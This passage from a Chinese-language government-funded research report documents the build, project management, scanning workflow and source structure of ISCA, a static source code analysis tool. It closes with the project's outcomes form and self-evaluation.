    步驟二：編譯 NativeExecInterface.java，並建立 C 標頭檔。 
       2.1 編譯 NativeExecInterface.java，產生 NativeExecInterface.class，因   
          NativeExecInterface 屬於 mil.csist.isca.scan.tool package，請將 
          NativeExecInterface.class 置於 mil \ csist \ isca \ scan \ tool \ 目錄下。 
% javac NativeExecInterface.java  // 產 生
NativeExecInterface.class 
// 將.class 檔置於 mil \ csist \ isca \ scan \ tool \ 目錄下 
       2.2 建立 C 標頭檔，名稱為 [package name_class name].h。 
% javah mil.csist.isca.scan.tool.NativeExecInterface 
// 產生 mil_csist_isca_scan_tool_NativeExecInterface.h 
 
    步驟三：以 CL 建立 DLL 檔。 
       3.1 設定 CL 環境變數 
% [Visual Studio 目錄] \ VC \ vcvarsall.bat 
       3.2 編譯 ExecProc.c，產生 ExecExtProcess.dll。 
% cl -I [jdk_dir]\include\ -I [jdk_dir]\include\win32 -LD 
ExecProc.c 
      -FeExecExtProcess.dll 
           [jdk_dir]為 JDK 安裝目錄。 
 
    ExecExtProcess.dll 即為我們所需的 DLL 檔，將其置於 ISCAPackage \ jni 目
錄下即可。 
    註：可先測詴光碟中已編譯完成的DLL檔可否使用，位於WinXP_Win7_DLL
目錄。ExecExtProcess_win7.dll for Windows 7、ExecExtProcess_winXpProf.dll for 
Windows XP Professional。 
  
 405 
 
III.  Integrated Source Code Analysis Tool 專案功能 
    ISCA 提供檢測專案功能，幫助使用者儲存檢測設定，管理各種分析專案，
ISCA 專案檔以資料夾形式存在，其內容如下表。 
ReportSection/ 儲存各分析工具原始報告檔 
Temp/ 此目錄為YASCA檢測單一檔案時使用之暫存
目錄 
ISCA.conf ISCA 專案組態檔，為 XML 文件 
    註一：ISCA 專案檔勿任意修改！ 
    註二：ReportSection/ 儲存之原始報告檔請自行刪除。 
3.1 Integrated Source Code Analysis Tool 專案功能介紹 
    啟動 ISCA 後，主畫面左上角是專案功能控制區塊，功能簡介如下表： 
新增專案  新增 ISCA 專案檔 
儲存專案設定  儲存現有專案設定於開啟之 ISCA 專案檔 
開啟專案  開啟先前儲存之 ISCA 專案檔 
分析工具選擇設定
 
選擇此專案使用分析工具 
儲存書面報表  當檢測完成後，按此鈕可輸出 HTML 書面報
表 
 
3.1.1 新增專案 
    點選”新增專案 ”，於對話視窗中輸入專案名稱，及選取專案所在目錄，按
下 OK 鈕後，即在所選目錄產生 ISCA 專案資料夾。 
 
 
 
 
 
 
  
輸入專案名稱 
選取專案所在目錄 
 407 
 
3.1.4 分析工具選擇設定 
    點選”分析工具選擇設定 ”，於視窗內勾選欲使用之檢測工具，選項會依所
選分析語言而定，如下圖顯示 Java 檢測只可挑選 Fortify SCA、YASCA。 
 
 
 
 
 
 
 
 
 
 
 
3.1.5 儲存書面報表 
點選“儲存書面報表 ”，選擇報表儲存位置，即輸出檢測結果於 HTML 書
面報告中。 
 
 
 
 
 
 
 
 
 
 
 
 
 
  
 409 
 
4.2 檢測流程 
    步驟一：新增或開啟現有專案設定檔。 
    步驟二：設定單一檢測，選擇分析語言、檢測檔案、選用工具。 
    步驟三：為方便下次檢測，請儲存 ISCA 專案組態。 
            (註：ISCA 專案組態不會自動儲存。) 
    步驟四：點選 SCAN 鈕，跳出分析進度視窗，確定執行分析再按進度視窗 
            的 SCAN 鈕，否則可離開。 
    步驟五：分析進度會顯示於進度視窗上，進度視窗無法關閉或取消檢測。 
    步驟六：檢測完成，進度視窗才可關閉。 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
    批次檢測流程亦同，相異點為選擇欲檢測目錄。 
 
    VB.NET 單一檔案檢測時，請選擇”Visual Studio 專案目錄下、具有.sln 設定
檔之目錄”。 
 
 
 
 
  
4. 
進度視窗 
 411 
 
V. Integrated Source Code Analysis Tool 原始碼管理 
    ISCA 以 Java SE 加上 SWT/JFace 函式庫撰寫，並以 Eclipse RCP 開發工具
進行撰寫，以下將介紹 ISCA 原始碼管理相關細節。 
 
5.1 設定 Eclipse RCP 3.6 開發環境 
    步驟一：先確定已安裝 Java Develop Toolkit 1.6 以上版本，並設定相關系統 
            環境變數(請參考 2.3 節)。 
    步驟二：將 eclipse-rcp-helios-win32.zip 解壓縮。 
    步驟三：eclipse-rcp-helios-win32 \ eclipse \ eclipse.exe 即為主程式，點選開  
            啟，並設定 workspace 所在目錄。 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
  
 413 
 
    步驟五：重設 ISCA 專案所需 Java 函式庫。 
5.1 在左方 Package 標籤中，右鍵點選 IntegratedAnalysis →  
Properties。 
        5.2 點選 Java Build Path → Libraries，此處為加入此 Eclipse 專案所需 
            Java 函式庫清單。 
        5.3 點選 Add External JARs，一一設定所需函式庫 JAR 檔。 
 
        ISCA 專案所需函式庫如下： 
名稱 位置 說明 
filterbuilder.jar [光碟資料目
錄 ] \ 
HTMLParser
-2.0-SNAPS
HOT \ bin \ 
Java HTML 
Parser 開源
專案，進行
YASCA 原
始報告檔剖
析用。 
htmllexer.jar 
htmlparser.jar 
sitecapturer.jar 
thumbelina.jar 
org.eclipse.core.commands_3.6.0.I20100512-1500.jar [Eclipse RCP 
3.6 目錄 ] \ 
plugins 
Eclipse 
SWT/JFace
專案，ISCA
圖形介面所
用函式庫。 
org.eclipse.core.runtime_3.6.0.v20100505.jar 
org.eclipse.equinox.common_3.6.0.v20100503.jar 
org.eclipse.jdt.ui_3.6.0.v20100602-1600.jar 
org.eclipse.jface.text_3.6.0.v20100526-0800.jar 
org.eclipse.jface_3.6.0.I20100601-0800.jar 
org.eclipse.osgi_3.6.0.v20100517.jar 
org.eclipse.swt.win32.win32.x86_3.6.0.v3650b.jar 
org.eclipse.text_3.5.0.v20100601-1300.jar 
org.eclipse.ui.editors_3.6.0.v20100520-0800.jar 
org.eclipse.ui.workbench_3.6.0.I20100603-1100.jar 
 
     
 
 
 
 
 
 
 
  
 415 
 
5.3 輸出 Executable JAR 
    撰寫/修改完成後，透過Eclipse提供的打包功能自動產生 Executable JAR檔，
可輕鬆產生包裝好的 Java 執行檔，並將環境設定一併完成。 
 
    步驟一：點選 File → Export…。 
    步驟二：點選 Java → Runnable JAR file，按下 next。 
    步驟三：設定欲打包專案即指定輸出路徑，Library handling 選項選擇”Extract  
            required libraries into generated JAR”，會將先前設定的外部函式庫 
            一併打包，按下 Finish，即打包完成。 
    步驟四：將打包好的 JAR檔命名為”ISCA.jar”，複製到 ISCAPackage目錄下。 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
  
 417 
 
VulnReportLabelProvider.java 構類別。 
scan ReportRender.java 
Scan.java 
ScanController.java 
ScanStatus.java 
ISCA 檢測流程控制。 
scan.tool CBMCScanOperation.java 
FortifySCAScanOperation.java 
FxCopScanOperation.java 
NativeExecInterface.java 
YASCAScanOperation.java 
呼叫外部工具進行檢
測之類別，與 JNI 介
面。 
sourceviewer SourceViewerContent.java 
SourceViewerManager.java 
管 理 JFace 
SourceViewer 開啟數
量之資料結構。 
ui UIMainWindow.java ISCA GUI 主畫面。 
ui.window EnvSettingWindow.java 
ProjectCreationWindow.java 
ProjectPropertyWindow.java 
ScanProgressWindow.java 
ISCA 其它互動介面
類別。 
util ExtFileFilter.java FileNameFilter ， 為
YASCAScanOperation
類別所用。 
wrapper BooleanWrapper.java Boolean 型態包裝類
別。 
 
 
  
國科會補助計畫衍生研發成果推廣資料表
日期:2011/03/02
國科會補助計畫
計畫名稱: 資訊產品安全檢測技術整合型研究
計畫主持人: 謝續平
計畫編號: 99-2623-E-009-005-D 學門領域: 電子與資訊系統
無研發成果推廣資料
期刊論文 1 0 80% 
[1] Vic Hsu, C.W. 
Wang, Shiuhpyng 
Shieh, ＇Reliability 
and Security of Large 
Scale Data Storage in 
Cloud Computing,＇ 
IEEE ATR, 2011. 
研究報告/技術報告 0 0 100%  
研討會論文 0 0 100% 
篇 
 
論文著作 
專書 0 0 100% 章/本  
申請中件數 0 0 100%  專利 已獲得件數 0 0 100% 件  
件數 0 0 100% 件  
技術移轉 
權利金 0 0 100% 千元  
碩士生 0 0 100%  
博士生 0 0 100%  
博士後研究員 0 0 100%  
國外 
參與計畫人力 
（外國籍） 
專任助理 0 0 100% 
人次 
 
其他成果 
(無法以量化表達之
成果如辦理學術活
動、獲得獎項、重要
國際合作、研究成果
國際影響力及其他協
助產業技術發展之具
體效益事項等，請以
文字敘述填列。) 
無 
 
 成果項目 量化 名稱或內容性質簡述 
測驗工具(含質性與量性) 0  
課程/模組 0  
電腦及網路系統或工具 0  
教材 0  
舉辦之活動/競賽 0  
研討會/工作坊 0  
電子報、網站 0  
科 
教 
處 
計 
畫 
加 
填 
項 
目 計畫成果推廣之參與（閱聽）人數 0  
國科會補助專題研究計畫成果報告自評表 
請就研究內容與原計畫相符程度、達成預期目標情況、研究成果之學術或應用價
值（簡要敘述成果所代表之意義、價值、影響或進一步發展之可能性）、是否適
合在學術期刊發表或申請專利、主要發現或其他有關價值等，作一綜合評估。
1. 請就研究內容與原計畫相符程度、達成預期目標情況作一綜合評估 
■達成目標 
□未達成目標（請說明，以 100字為限） 
□實驗失敗 
□因故實驗中斷 
□其他原因 
說明： 
2. 研究成果在學術期刊發表或申請專利等情形： 
論文：■已發表 □未發表之文稿 □撰寫中 □無 
專利：□已獲得 □申請中 ■無 
技轉：□已技轉 □洽談中 ■無 
其他：（以 100字為限） 
會議論文 
王繼偉、王嘉偉、許家維、謝續平，＇＇＇＇基於虛擬機器外部觀察與映像檔比對的惡意
程式分析＇＇＇＇, The 20th Cryptology and Information Security Conference (CISC 
2010), Taiwan, 2010. 
